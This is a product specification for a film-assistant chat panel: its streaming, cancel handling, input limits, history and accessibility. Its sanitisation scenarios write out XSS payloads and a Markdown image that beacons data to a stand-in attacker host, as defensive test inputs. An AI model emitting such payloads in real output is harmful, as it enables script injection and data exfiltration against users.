# chat-ui Specification

## Purpose

The floating chat of the frontend (B-04, CU-013, CU-014; doc 04 §3.1 and canvas section 10): a FAB on every screen that opens a drawer on desktop and a bottom sheet on mobile, where the user talks to the assistant and sees up to three title cards per answer. There is no `/chat` page (28/10/2026).

## Requirements

### Requirement: One chat, available everywhere

The chat state MUST live in a provider in the root layout so it survives navigation. The FAB MUST be on every screen with the chat, disabled without a session, with the accessible name of doc 04. «Ask FilmAI» in the Home and the footer MUST open the panel instead of navigating.

#### Scenario: Navigating with the panel open

- GIVEN the panel is open with a conversation
- WHEN the user navigates to another page
- THEN the conversation and any streaming answer are still there

#### Scenario: Without a session

- GIVEN a visitor without a session
- WHEN they look at the FAB
- THEN it is disabled and nothing is requested from the chat API

### Requirement: Streaming answer with cancel

While an answer streams the panel MUST show the status from `estado` codes, append `texto` deltas in order, render `tarjetas` when they arrive, and turn the send button into «Cancelar». The input MUST stay editable as a draft but MUST NOT send. Cancelling MUST abort the request, show «Solicitud cancelada» and re-enable sending; an answer completing at the same instant MUST be discarded (CU-014 2.A).

#### Scenario: Cancel

- GIVEN an answer is streaming
- WHEN the user presses «Cancelar»
- THEN the request is aborted
- AND the partial answer is removed and «Solicitud cancelada» is shown
- AND the question stays in the input to retry

#### Scenario: Cancel arrives after `fin`

- GIVEN the `fin` event was already received
- WHEN the user presses «Cancelar» in the same instant
- THEN the cancel is ignored and the answer is shown as saved

#### Scenario: `error` after some text

- GIVEN several `texto` deltas were shown
- WHEN an `error` event with `code: "chat_unavailable"` arrives
- THEN the partial answer is removed (it was not saved)
- AND the message for that code is shown, translated with the error catalog
- AND the question stays in the input to retry

#### Scenario: Stream ends without `fin`

- GIVEN the connection drops mid-answer
- WHEN the stream closes without `fin` or `error`
- THEN the panel shows the network error and keeps the question to retry

### Requirement: Model output is never trusted as HTML

Answers MUST be rendered as Markdown without raw HTML and sanitized. Links and images written by the model MUST be rendered as plain text: no clickable link and no image request. Card links MUST be built by the frontend from `id_tmdb` and `tipo`. `dangerouslySetInnerHTML` MUST NOT be used (28/10/2026).

#### Scenario: Injected markup

- GIVEN an answer containing `<img src=x onerror=alert(1)>`, `<script>` and `[clic](javascript:alert(1))`
- WHEN it is rendered
- THEN no script runs, no image element is created, and no link with `javascript:` exists

#### Scenario: Markdown image pointing outside

- GIVEN an answer containing `![x](https://atacante.example/pixel?d=1)`
- WHEN it is rendered
- THEN no `img` element exists and the browser makes no request to that host

### Requirement: Input limits

The input MUST NOT accept more than 500 characters (`maxLength`), MUST show a counter near the limit, and MUST NOT send an empty or whitespace-only message. Enter MUST send and Shift+Enter MUST insert a line break.

#### Scenario: Pasting a long text

- GIVEN the user pastes 600 characters
- WHEN the input updates
- THEN it holds 500 characters and the counter shows the limit

### Requirement: Welcome, history and unread badge

On opening, the panel MUST load the history (newest page first, older pages on scrolling up) and, when the chat is empty, show the local welcome with the user's first name and the canvas suggestions, without calling the model. An answer that finishes while the panel is closed MUST light the FAB badge until the panel opens.

#### Scenario: First time

- GIVEN a user with no messages
- WHEN they open the panel
- THEN they see the welcome with their first name and three suggestions
- AND no request is sent to the model

### Requirement: Accessible panel

The panel MUST open and close with keyboard and pointer, trap focus while open, close with Escape and return focus to the FAB. A finished answer MUST be announced once through a polite live region, not delta by delta.

#### Scenario: Keyboard only

- GIVEN focus on the FAB
- WHEN the user presses Enter, types a message, sends it and presses Escape
- THEN the panel opened with focus on the input, the message was sent, and focus returned to the FAB
